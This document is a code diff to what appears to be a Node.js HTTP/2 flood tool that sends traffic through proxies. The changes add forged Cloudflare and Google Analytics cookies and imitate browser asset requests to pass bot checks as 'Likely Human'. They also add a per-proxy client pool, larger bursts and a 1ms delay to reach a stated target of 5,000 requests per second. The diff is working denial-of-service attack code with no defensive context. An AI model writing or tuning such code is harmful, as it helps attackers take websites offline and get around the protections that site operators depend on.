@@ -386,14 +386,32 @@ const generateHeaders = (browser) => {
 
     const selectedHeaders = browserHeaders[browser] || browserHeaders['chrome'];
     
+    // Cookie Simulation for "Likely Human"
+    const cookies = [
+        `__cf_bm=${randstr(40)}`,
+        `cf_clearance=${randstr(45)}`,
+        `_ga=GA1.1.${getRandomInt(100000000, 999999999)}.${Math.floor(Date.now()/1000)}`,
+        `session_id=${generateRandomString(32)}`
+    ];
+
     // Combine in correct order
-    return Object.assign({}, base, selectedHeaders, {
-        'referer': randomElement(refs),
+    const finalHeaders = Object.assign({}, base, selectedHeaders, {
+        'referer': Math.random() < 0.2 ? undefined : randomElement(refs),
+        'cookie': cookies.slice(0, getRandomInt(1, 4)).join('; '),
         'x-request-id': generateRandomString(32),
-        'x-client-ip': lip1,
-        'x-forwarded-for': lip2,
     });
+
+    // Simulasi Static Asset (JS/CSS/IMG) untuk Human Score
+    if (Math.random() < 0.15) {
+        const assets = ['.js', '.css', '.png', '.jpg', '.svg', '.woff2'];
+        finalHeaders[':path'] = `/static/${randstr(8)}${randomElement(assets)}?v=${getRandomInt(1,999)}`;
+        finalHeaders['accept'] = '*/*';
+        finalHeaders['sec-fetch-dest'] = 'script';
+    }
+
+    return finalHeaders;
 };
+
 
 const browser = getRandomBrowser();
 const headers = generateHeaders(browser);
@@ -523,6 +541,22 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
         let count = 0;
         let running = true;
 
+        // Connection Pool untuk High RPS
+        const clients = [];
+        const createClient = () => {
+            const c = http2.connect(parsedTarget.href, {
+                protocol: "https",
+                createConnection: () => tlsSocket,
+                settings : h2settings,
+                socket: tlsSocket,
+            });
+            c.setMaxListeners(0);
+            return c;
+        };
+
+        // Pre-warm 3 clients per proxy connection
+        for(let i=0; i<3; i++) clients.push(createClient());
+
         const doBurst = async () => {
             if (!running) return;
             if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) {
@@ -530,14 +564,15 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
                 return;
             }
 
-            // Extreme Volume logic: kirim multiple requests per setImmediate
-            const burstSize = Math.max(1, Math.floor(args.Rate / 10)); 
+            // Target 5k RPS logic: Lebih agresif
+            const burstSize = Math.max(5, Math.floor(args.Rate / 5)); 
             
             for (let i = 0; i < burstSize; i++) {
                 if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) break;
                 
                 const freshBrowser = getRandomBrowser();
                 const dynHeaders = generateHeaders(freshBrowser);
+                const client = randomElement(clients);
 
                 try {
                     setImmediate(() => {
@@ -558,16 +593,17 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
 
                 if (count >= args.time * args.Rate) {
                     running = false;
-                    client.close(http2.constants.NGHTTP2_CANCEL);
+                    clients.forEach(c => c.close());
                     return;
                 }
             }
 
             if (running) {
-                // Sempitkan delay (1ms - 5ms) untuk High RPS
-                setTimeout(doBurst, getRandomInt(1, 5));
+                // Delay minimalis untuk target 5k peak
+                setTimeout(doBurst, 1);
             }
         };
+
 
 
 
